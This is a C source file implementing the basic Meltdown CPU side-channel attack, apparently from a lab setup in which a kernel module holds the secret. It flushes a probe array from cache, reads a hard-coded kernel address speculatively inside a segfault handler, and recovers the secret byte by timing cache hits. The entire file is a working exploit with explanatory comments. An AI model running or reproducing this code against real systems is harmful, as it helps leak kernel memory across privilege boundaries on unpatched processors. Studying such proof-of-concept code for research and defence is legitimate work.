/*
 * vanilla.c 
 * The vanilla meltdown attack. 
 *
 * NOTE:
 * Low attack success rate with this basic approach. 
 *
 * Kyle Dotterrer
 * December, 2018 
 */

#include <stdio.h>
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <emmintrin.h>
#include <x86intrin.h>

/* ----------------------------------------------------------------------------
	Constants
*/

// address of secret data in kernel memory 
// NOTE: this address will change each time kernal module is reinstalled 
#define KERNEL_ADDR 0xf8d73000

// array access below cycles assumed to be cache hit  
#define CACHE_HIT_THRESHOLD (80)  

#define ARRSIZE (256)
#define DELTA   (1024)  // offset on each array access 

/* ----------------------------------------------------------------------------
	Local Prototypes 
*/

void flush_side_channel  (void);
void reload_side_channel (void); 

void meltdown(unsigned long kernel_data_addr);

static void catch_segv(); 

/* ----------------------------------------------------------------------------
	Global Variables 
*/

static sigjmp_buf jbuf;

uint8_t array[ARRSIZE*4096];

/* ----------------------------------------------------------------------------
	Main
*/

int main(void) {
	// setup signal handler for memory violation 
	signal(SIGSEGV, catch_segv);

	// flush the probe array
	flush_side_channel();

	if (sigsetjmp(jbuf, 1) == 0) {
		meltdown(KERNEL_ADDR);
	} else {
		printf("memory violation!\n");
	}

	reload_side_channel();

	exit(0); 
}

/* ----------------------------------------------------------------------------
	Local Functions 
*/

void flush_side_channel(void) {
	// write to array to bring it to RAM
	// prevents copy on write 
	for (int i = 0; i < ARRSIZE; i++) 
		array[i*4096 + DELTA] = 1;

	// flush the entire array from cache 
	for (int i = 0; i < ARRSIZE; i++) 
		_mm_clflush(&array[i*4096 + DELTA]);
}

void reload_side_channel(void) {
	// where we store register contents
	// dont care about this 
	unsigned int junk = 0;

	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (int i = 0; i < ARRSIZE; i++) {
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr; 
		time2 = __rdtscp(&junk) - time1;

		// large variable latency of access time due to caching 
		// allows us to determine (with high degree of certainty)
		// what the secret value used to access the array was 
		if (time2 <= CACHE_HIT_THRESHOLD) {
			printf("array[%d*4096 + %d] is in cache\n", i, DELTA);
			printf("the secret = %c\n", (char) i);
		}
	}
}

void meltdown(unsigned long kernel_data_addr) {
	char kernel_data = 0;

	// operation will cause memory violation
	kernel_data = *(char *) kernel_data_addr;

	// altered from previous example
	// now we use the kernel data to access the probe array 
	array[kernel_data*4096 + DELTA] += 1;
}

static void catch_segv() {
	siglongjmp(jbuf, 1); 
}
